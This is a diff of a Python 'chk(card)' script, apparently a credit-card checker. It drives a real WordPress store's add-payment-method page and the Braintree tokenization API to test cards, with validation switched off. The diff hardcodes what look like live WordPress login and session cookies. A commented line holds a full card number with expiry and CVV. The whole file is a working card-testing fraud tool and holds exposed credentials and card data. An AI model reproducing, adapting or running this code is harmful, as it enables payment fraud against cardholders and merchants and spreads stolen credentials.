@@ -74,12 +74,42 @@ def chk(card):
 	
 
 
+
+
+	cookies = {
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    '_gcl_au': '1.1.1039263952.1717904732',
+    '_ga': 'GA1.1.1613173725.1717904732',
+    '_fbp': 'fb.1.1717904732684.350208071803167906',
+    'newpass_announce': 'true',
+    'cookielawinfo-checkbox-functional': 'yes',
+    'cookielawinfo-checkbox-performance': 'yes',
+    'cookielawinfo-checkbox-analytics': 'yes',
+    'cookielawinfo-checkbox-advertisement': 'yes',
+    'cookielawinfo-checkbox-others': 'yes',
+    'viewed_cookie_policy': 'yes',
+    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
+    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
+    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7',
+    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08',
+    'br_lgv_stat': 'default%7Cdefault',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    '_uetsid': 'fd671680313e11efb3b4ad929e930dfe',
+    '_uetvid': 'b873acf0261211efa5545d92dac21af2',
+    '_ga_JVCGZDD7ML': 'GS1.1.1719140052.16.0.1719140052.60.0.228063135',
+    'sbjs_udata': 'vst%3D16%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
+}
+
 	headers = {
     'authority': 'ce4less.com',
     'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1039263952.1717904732; _ga=GA1.1.1613173725.1717904732; _fbp=fb.1.1717904732684.350208071803167906; newpass_announce=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; _uetsid=fd671680313e11efb3b4ad929e930dfe; _uetvid=b873acf0261211efa5545d92dac21af2; _ga_JVCGZDD7ML=GS1.1.1719140052.16.0.1719140052.60.0.228063135; sbjs_udata=vst%3D16%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
     'origin': 'https://ce4less.com',
     'pragma': 'no-cache',
     'referer': 'https://ce4less.com/my-account/add-payment-method/',
@@ -100,8 +130,7 @@ def chk(card):
 
 	response = requests.post('https://ce4less.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
-	
-	
+		
 	enc = response.json()['data']
 	
 	dec = base64.b64decode(enc).decode('utf-8')
@@ -111,11 +140,13 @@ def chk(card):
 	
 	
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-    'authorization': f'Bearer {au}',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': f'Bearer{au}',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -135,7 +166,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '379f0177-032a-47fd-9e6a-56561cd41a24',
+        'sessionId': '2e284e0a-2b43-4dd1-9d20-e6ec261b0f2c',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -156,6 +187,11 @@ def chk(card):
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2e284e0a-2b43-4dd1-9d20-e6ec261b0f2c"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+
 
 
 	tok = response.json()['data']['tokenizeCreditCard']['token']
@@ -163,12 +199,42 @@ def chk(card):
 
 
 
+
+
+	cookies = {
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    '_gcl_au': '1.1.1039263952.1717904732',
+    '_ga': 'GA1.1.1613173725.1717904732',
+    '_fbp': 'fb.1.1717904732684.350208071803167906',
+    'newpass_announce': 'true',
+    'cookielawinfo-checkbox-functional': 'yes',
+    'cookielawinfo-checkbox-performance': 'yes',
+    'cookielawinfo-checkbox-analytics': 'yes',
+    'cookielawinfo-checkbox-advertisement': 'yes',
+    'cookielawinfo-checkbox-others': 'yes',
+    'viewed_cookie_policy': 'yes',
+    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
+    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
+    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7',
+    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08',
+    'br_lgv_stat': 'default%7Cdefault',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_udata': 'vst%3D21%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_JVCGZDD7ML': 'GS1.1.1719180498.22.1.1719180641.58.0.1578012530',
+    '_uetsid': 'fd671680313e11efb3b4ad929e930dfe',
+    '_uetvid': 'b873acf0261211efa5545d92dac21af2',
+}
+
 	headers = {
     'authority': 'ce4less.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1039263952.1717904732; _ga=GA1.1.1613173725.1717904732; _fbp=fb.1.1717904732684.350208071803167906; newpass_announce=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D21%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JVCGZDD7ML=GS1.1.1719180498.22.1.1719180641.58.0.1578012530; _uetsid=fd671680313e11efb3b4ad929e930dfe; _uetvid=b873acf0261211efa5545d92dac21af2',
     'origin': 'https://ce4less.com',
     'pragma': 'no-cache',
     'referer': 'https://ce4less.com/my-account/add-payment-method/',
